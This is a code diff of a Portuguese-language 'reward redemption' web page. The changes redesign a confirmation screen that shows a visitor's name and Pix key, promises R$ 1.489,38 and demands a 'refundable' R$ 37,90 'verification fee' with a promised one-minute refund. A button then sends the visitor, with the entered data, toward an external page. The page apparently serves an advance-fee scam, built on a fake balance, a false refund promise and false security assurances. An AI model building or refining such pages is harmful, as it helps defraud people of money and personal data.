@@ -7,25 +7,26 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
     <style>
         /* =========================================
-           CSS GERAL (PREMIUM / FIEL)
+           CSS GERAL & TELA 1 (PREMIUM APROVADO)
            ========================================= */
         * { margin: 0; padding: 0; box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
         
         body { 
-            font-family: 'Roboto', sans-serif; 
-            background: #f0f2f5; 
+            font-family: 'Roboto', sans-serif, Arial; 
+            background: #f0f2f5; /* Fundo padrão */
             display: flex; 
             justify-content: center; 
             min-height: 100vh;
             color: #333;
         }
 
-        .container { width: 100%; max-width: 450px; padding: 20px; position: relative; z-index: 1; }
+        /* Utilitários */
         .hidden { display: none !important; }
-        .fade-in { animation: fadeIn 0.3s ease-in-out; }
+        .fade-in { animation: fadeIn 0.4s ease-in-out; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* --- TELA 1: DASHBOARD --- */
+        /* ESTILOS TELA 1 (DASHBOARD) */
+        .container-dashboard { width: 100%; max-width: 450px; padding: 20px; position: relative; z-index: 1; }
         .title { text-align: center; font-size: 20px; font-weight: 900; margin-bottom: 20px; color: #222; }
         .saldo-card { 
             background: linear-gradient(135deg, #F15A29 0%, #ff7e5f 100%);
@@ -63,7 +64,9 @@
         .shop-text p { font-size: 11px; color: #777; line-height: 1.5; }
         .shop-icon { width: 50px; height: 50px; background: #fff5f0; color: #F15A29; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 900; flex-shrink: 0; }
 
-        /* --- TELA 2: MODAL --- */
+        /* =========================================
+           CSS TELA 2 (MODAL APROVADO)
+           ========================================= */
         .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: flex; align-items: flex-end; justify-content: center; z-index: 100; backdrop-filter: blur(2px); }
         .modal { width: 100%; max-width: 450px; background: #f5f5f5; border-radius: 18px 18px 0 0; overflow: hidden; animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1); box-shadow: 0 -5px 30px rgba(0,0,0,0.2); }
         @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
@@ -85,70 +88,47 @@
         .secure { text-align: center; font-size: 11px; color: #999; padding-top: 15px; border-top: 1px solid #eee; margin-top: 10px; }
 
         /* =========================================
-           CSS TELA 3 (CONFIRMAÇÃO FIEL)
+           CSS TELA 3 (CONFIRMAÇÃO - NOVO DESIGN FIEL)
            ========================================= */
-        .confirm-card {
-            background: white; border-radius: 20px; padding: 0;
-            box-shadow: 0 4px 25px rgba(0,0,0,0.08); overflow: hidden;
-            margin-top: 10px;
-        }
-        
-        /* Cabeçalho Taxa */
-        .tax-header {
-            background: #fff5f3; padding: 25px 20px;
-            border-bottom: 2px dashed #ffdecb; text-align: center;
-        }
-        .tax-title { font-size: 13px; color: #777; text-transform: uppercase; font-weight: 700; margin-bottom: 5px; }
-        .tax-value { font-size: 32px; font-weight: 900; color: #F15A29; }
-        .tax-badge { 
-            background: #e3fcef; color: #00b894; font-size: 10px; 
-            padding: 4px 10px; border-radius: 20px; font-weight: 800; 
-            display: inline-block; margin-top: 5px; text-transform: uppercase;
-        }
+        .app { width: 100%; max-width: 420px; padding-bottom: 140px; margin: 0 auto; }
 
-        /* Lista de Dados */
-        .data-list { padding: 10px 0; }
-        .data-item {
-            display: flex; justify-content: space-between;
-            padding: 15px 25px; border-bottom: 1px solid #f0f0f0;
-            font-size: 14px;
-        }
-        .data-item:last-child { border-bottom: none; }
-        .data-key { color: #999; font-weight: 500; }
-        .data-val { color: #333; font-weight: 700; text-align: right; }
-        
-        /* Total */
-        .total-row {
-            background: #f9f9f9; padding: 20px 25px;
-            display: flex; justify-content: space-between; align-items: center;
-            border-top: 1px solid #eee;
-        }
-        .total-label { font-size: 14px; font-weight: 700; color: #555; }
-        .total-value { font-size: 18px; font-weight: 900; color: #2d3436; }
+        /* CARD PADRÃO */
+        .card { background: #fff; margin: 15px; padding: 18px; border-radius: 10px; box-shadow: 0 2px 6px rgba(0,0,0,0.05); }
+        .card h3 { font-size: 13px; color: #666; margin-bottom: 12px; letter-spacing: .3px; font-weight: 700; text-transform: uppercase; }
 
-        /* Botão Laranja Especial */
-        .btn-pay-tax {
-            width: 100%; padding: 18px; border-radius: 12px; border: none;
-            background: linear-gradient(180deg, #F15A29 0%, #d63f0f 100%);
-            color: white; font-size: 16px; font-weight: 800;
-            cursor: pointer; margin-top: 25px;
-            box-shadow: 0 4px 0 #bf360c, 0 10px 20px rgba(241, 90, 41, 0.4);
-            text-transform: uppercase; position: relative; top: 0;
-            transition: all 0.1s;
-        }
-        .btn-pay-tax:active { top: 4px; box-shadow: 0 0 0 #bf360c, inset 0 2px 5px rgba(0,0,0,0.2); }
-        
-        .timer-info {
-            display: flex; justify-content: center; gap: 8px;
-            font-size: 12px; color: #00a870; font-weight: 600;
-            margin-top: 20px; align-items: center;
-        }
+        /* DESTAQUE */
+        .destaque { border-left: 4px solid #ee4d2d; }
+        .valor-row { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+        .valor { font-size: 22px; font-weight: bold; color: #ee4d2d; }
+        .badge { background: #dff5e8; color: #1f9c6b; font-size: 11px; padding: 4px 8px; border-radius: 4px; font-weight: bold; }
+        .descricao { font-size: 14px; color: #333; line-height: 1.4; }
+
+        /* DADOS */
+        .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14px; }
+        .info-row:last-child { border-bottom: none; }
+        .info-row span { color: #777; }
+        .info-row strong { color: #000; }
+
+        /* STEPS */
+        .step { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 18px; }
+        .circle { width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: bold; flex-shrink: 0; }
+        .red { background: #ffe5e0; color: #ee4d2d; }
+        .green { background: #dff5e8; color: #1f9c6b; }
+        .gray { background: #eee; color: #999; }
+        .step p { font-size: 13px; color: #777; margin: 2px 0 0 0; }
+        .green-text { color: #1f9c6b; }
+
+        /* BOTTOM BAR */
+        .bottom-bar { position: fixed; bottom: 0; left: 0; right: 0; margin: 0 auto; width: 100%; max-width: 450px; background: #fff; padding: 15px; box-shadow: 0 -4px 10px rgba(0,0,0,0.08); z-index: 50; }
+        .cta { width: 100%; padding: 16px; background: #ee4d2d; color: #fff; font-weight: bold; border: none; border-radius: 8px; font-size: 14px; cursor: pointer; text-transform: uppercase; }
+        .cta:hover { opacity: 0.95; }
+        .reembolso { text-align: center; font-size: 12px; color: #1f9c6b; margin-top: 8px; font-weight: 500; }
 
     </style>
 </head>
 <body>
 
-    <div id="screen-dashboard" class="container">
+    <div id="screen-dashboard" class="container-dashboard">
         <h1 class="title">Resgatar recompensas</h1>
 
         <div class="saldo-card">
@@ -204,48 +184,73 @@
         </div>
     </div>
 
-    <div id="screen-confirmation" class="container hidden fade-in">
-        <h1 class="title">Conferir Dados</h1>
-        
-        <div class="confirm-card">
-            <div class="tax-header">
-                <div class="tax-title">Taxa de Verificação</div>
-                <div class="tax-value">R$ 37,90</div>
-                <div class="tax-badge">Reembolsável</div>
+    <div id="screen-confirmation" class="hidden fade-in">
+        <div class="app">
+
+            <div class="card destaque">
+                <h3>CONFIRMAÇÃO DE IDENTIDADE</h3>
+                <div class="valor-row">
+                    <span class="valor">R$ 37,90</span>
+                    <span class="badge">VALOR REEMBOLSÁVEL</span>
+                </div>
+                <p class="descricao">
+                    Taxa obrigatória para liberação do bônus. O valor de <strong>R$ 37,90</strong>
+                    será reembolsado integralmente para você em 1 minuto.
+                </p>
             </div>
 
-            <div class="data-list">
-                <div class="data-item">
-                    <span class="data-key">Nome</span>
-                    <span class="data-val" id="conf-nome">...</span>
+            <div class="card">
+                <h3>DADOS PARA REEMBOLSO</h3>
+                <div class="info-row">
+                    <span>Nome</span>
+                    <strong><span id="conf-nome">...</span></strong>
                 </div>
-                <div class="data-item">
-                    <span class="data-key">Chave Pix</span>
-                    <span class="data-val" id="conf-chave">...</span>
+                <div class="info-row">
+                    <span>Data</span>
+                    <strong><span id="conf-data">...</span></strong>
                 </div>
-                <div class="data-item">
-                    <span class="data-key">Data</span>
-                    <span class="data-val" id="conf-data">...</span>
+                <div class="info-row">
+                    <span>Chave PIX</span>
+                    <strong><span id="conf-chave">...</span></strong>
+                </div>
+                <div class="info-row">
+                    <span>Valor a receber</span>
+                    <strong>R$ 1.489,38</strong>
                 </div>
             </div>
 
-            <div class="total-row">
-                <span class="total-label">Valor a receber:</span>
-                <span class="total-value">R$ 1.489,38</span>
+            <div class="card">
+                <h3>PROCESSO DE LIBERAÇÃO</h3>
+                <div class="step">
+                    <div class="circle red">1</div>
+                    <div>
+                        <strong>Pagar taxa de confirmação</strong>
+                        <p>Para verificação de identidade</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="circle green">✔</div>
+                    <div>
+                        <strong class="green-text">Receber reembolso automático</strong>
+                        <p>Valor devolvido em 1 minuto</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="circle gray">3</div>
+                    <div>
+                        <strong>Acessar saldo completo</strong>
+                        <p>R$ 1.489,38 liberado para saque</p>
+                    </div>
+                </div>
             </div>
-        </div>
 
-        <button class="btn-pay-tax" onclick="redirectToExternalVSL()">
-            PAGAR TAXA E LIBERAR SAQUE
-        </button>
+            <div class="bottom-bar">
+                <button class="cta" onclick="redirectToExternalVSL()">PAGAR TAXA PARA LIBERAR SAQUE</button>
+                <div class="reembolso">
+                    ⏱ Reembolso automático em 1 minuto
+                </div>
+            </div>
 
-        <div class="timer-info">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-            Reembolso automático em 1 minuto
-        </div>
-
-        <div class="secure" style="margin-top: 30px;">
-            Ambiente Seguro. Seus dados estão protegidos.
         </div>
     </div>
 
@@ -307,15 +312,21 @@
             // Mostra Tela 3
             document.getElementById('screen-confirmation').classList.remove('hidden');
             
+            // Troca o fundo da página para cinza mais escuro (como pedido no CSS da tela 3)
+            document.body.style.backgroundColor = "#e9e9e9"; 
+
             // Preenche Dados Automaticamente
             document.getElementById('conf-nome').innerText = nome;
             document.getElementById('conf-chave').innerText = chave;
             document.getElementById('conf-data').innerText = new Date().toLocaleDateString('pt-BR');
+            
+            // Rola para o topo
+            window.scrollTo(0,0);
         }
 
         // 4. REDIRECIONAR PARA VSL (COM DADOS)
         function redirectToExternalVSL() {
-            const btn = document.querySelector('.btn-pay-tax');
+            const btn = document.querySelector('.cta');
             btn.innerText = "PROCESSANDO...";
             
             const nome = document.getElementById('input-nome').value;
